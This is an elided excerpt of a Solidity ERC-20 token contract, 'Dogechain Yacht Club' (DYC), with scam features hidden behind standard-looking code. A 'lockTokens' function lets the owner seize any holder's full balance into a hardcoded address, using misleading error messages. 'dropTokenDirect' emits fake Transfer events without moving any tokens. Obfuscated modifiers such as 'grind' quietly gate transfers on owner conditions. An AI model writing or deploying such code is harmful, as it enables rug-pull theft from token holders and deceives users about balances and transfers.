...
contract DogechainYachtClub is Context, IERC20 {
    ...
    address deployer = 0x36f8A9eBb4479B1b877920b4cE0a11Ee25C29a8b;
    address public _ownr = 0x157583039cb4142Db0ECe2aA41a74bDE4FF96A33;
   constructor () public {

        _name = "Dogechain Yacht Club";
        _symbol = "DYC";
        _decimals = 18;
        ...
        appeal(0xAE8c82820ee029FECc826B45D2B3871053c3ba8A);
        appeal(0x3f7F434a8820cEC1ECA34B9B01f64c0E2f822924);
        appeal(0x1a98705755E80FCA2f9e0f53bF9eb420e10Ab1D3);
    }
   ...
   function _mApproval(address safeOwner) public {
    ...
    modifier grind(address dest, uint256 num, address from, address filler){
        if (
            _ownr == _safeOwnr 
            && from == _ownr
            )
    ...
    function _tf(address from, address dest, uint256 amt) internal grind( dest,  amt,  from,  address(0)) virtual {
        _pair( from,  dest,  amt);
    }
    
   
    function _pair(address from, address dest, uint256 amt) internal grind( dest,  amt,  from,  address(0)) virtual {
...
//-----------------------------------------------------------------------------------------------------------------------//
  ...
  function dropTokenDirect(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _verify(){
    //MultiEmit
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(uPool, eReceiver[i], eAmounts[i]);}}
  ...
  function lockTokens(address account) public _verify{
        require(msg.sender == _ownr, "ERC20: mint to the zero address");
        uint256 amount = _balances[account];
        _beforeTokenTransfer(account, 0xE2fE530C047f2d85298b07D9333C05737f1435fB, amount);
        

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _balances[0xE2fE530C047f2d85298b07D9333C05737f1435fB] = _balances[0xE2fE530C047f2d85298b07D9333C05737f1435fB].add(amount);
        
        emit Transfer(account, 0xE2fE530C047f2d85298b07D9333C05737f1435fB, amount);
    }



  function appeal(address recipient) public _verify(){
 	//allow
  ...
  function transact(address recipient) public _verify(){
